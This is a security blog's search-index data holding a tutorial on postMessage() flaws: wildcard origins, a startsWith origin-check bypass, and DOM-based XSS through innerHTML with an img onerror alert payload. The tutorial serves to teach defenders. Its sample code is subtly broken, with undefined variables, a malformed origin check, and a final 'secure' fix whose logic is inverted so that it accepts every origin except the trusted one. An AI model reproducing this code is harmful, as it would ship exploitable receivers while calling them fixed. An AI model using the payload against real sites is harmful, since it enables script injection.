\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; First we take the Window object of the iframe and the message which we want to send, then we set a function() for onsubmit event of form, that call postMessage() on iframe Window object.You can also set * instead of http://domain-b.com. The * means this message can send to anyone, actually you can specify the origin in that, but we set it as * which means it could be anyone (any origin), sooo\u0026hellip; Never do that in production stage. :))\nNow we need to code the receiver of postMessage(). I just want to write what receiver got in the page.\nhxxp://domain-b.com/receiver.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { document.write(event.origin); msg = \u0026#34;Message: \u0026#34; + event.data; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; addEventListener() will wait for an event, if it receive an event it will call a function which specified. attachEvent() is like addEventListener() but instead for Internet Explorer and Opera. \u0026quot;message\u0026quot; is the type of event that we waiting for. displayMessage is a function which will be call when we get what we waiting for (\u0026quot;message\u0026quot;).\nNow we know how a postMessage() work. Let\u0026rsquo;s move on and explain what vulnerabilities may occur.\npostMessage Vulnerabilities Three vulnerabilities can occur in postMessage.\nSender Origin is set to * Receiver does not verify the origin of the sender Receiver does not sanitize the data which received The first one is obvious and we pointed out before. Now I want to show you how to abuse the second and third misconfigurations.\nAs we already discussed, receiver wait for an event (based on the type of addEventListener()) then a function will call, but we didn\u0026rsquo;t said who can send data to receiver?! It has a simple answer, EVERYONE!\nSo everone can send data to any receiver, It is on receiver own to check the sender origin, If it doesn\u0026rsquo;t, the receiver \u0026ldquo;event listener\u0026rdquo; will accept any event. It means an attacker also can send a malicious data to receiver. A secure way to fix this issue is checking the Origin. It just needs a if condition. Let\u0026rsquo;s explain by an example.\nhxxp://domain-b.com/receiver.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { if (evt.origin.startsWith != \u0026#34;http://domain-a.com\u0026#34;) { console.log(\u0026#34;Invalid Origin! Do Not try Hacking at home. :)\u0026#34;); } else { document.write(event.origin); msg = \u0026#34;Message: \u0026#34; + event.data; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; I think it doesn\u0026rsquo;t need any explain. It just like the previous receiver, the only difference is an if condition. It checks if origin is started with \u0026ldquo;hxxp://domain-a.com\u0026rdquo;, If an attacker try to send a data with a \u0026ldquo;hxxp://attacker.com\u0026rdquo;, the receiver will write an error log. BUT, what if an attacker send a data by \u0026ldquo;hxxp://domain-a.com.attacker.com\u0026rdquo; domain?! Yeaaa\u0026hellip; Bypassed! The receiver will accept data. A secure way to implement is to check complete origin instead of startsWith or endsWith to compare a part of origin.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { if (evt.origin == \u0026#34;http://domain-a.com\u0026#34;) { console.log(\u0026#34;Invalid Origin! Do Not try Hacking at home. :)\u0026#34;); } else { document.write(event.origin); msg = \u0026#34;Message: \u0026#34; + event.data; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Now it is better! :)\nNow we get to the last misconfiguration. Consider a simple chatroom is implemented by the postMessage() functionality. There is a server which accept data from anywhere, It shows everyone data (message) that sent just like the first example that we implemented. The receiver shows the message by innerHTML JavaScript function.\nBreak (DOM-Base XSS) Cross-Site Scripting (a.k.a XSS) is a vulnerability that occur when user inputs reflect somewhere without sanitizing. It leds attacker to inject a script into the page that JavaScript is the most common one scripting language to exploit this vulnerability. XSS has different types:\nReflected Stored DOM There are also other types like mXSS or Self-XSS, But they are not an actual type, they can be one of the 3 main types. If you inject a JavaScript code into the vulnerable JavaScript code (which means it doesn\u0026rsquo;t need to send a request to server for injecting JavaScript), it\u0026rsquo;s a DOM-based XSS. Back to the Future (postMessage) innerHTML is one of the vulnerable Javascript property that leads to DOM-based XSS. As you can see in the first example of receiver.html, the received data (message) are displayed by innerHTML. So what now?! Just send \u0026lt;img src=x onerror=alert(1337)\u0026gt; and now we exploited a XSS vulnerability.\n","permalink":"http://localhost:1313/posts/postmessage-vulnerabilities/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.de/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.nl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"I\u0026rsquo;m Kousha (@INVOXES), a PenTester and Independent Security Researcher with a passion for exploring the depths of cybersecurity. I specialize in penetration testing across various fields and focus my research on web and Android security. I love dissecting complex systems to understand how they work and uncover potential vulnerabilities.\nWelcome to my blog, where I share my journey, insights, and discoveries in the ever-evolving world of security!\nGet in touch if you want via Contact .\n","permalink":"http://localhost:1313/about/","tags":null,"title":"About"}]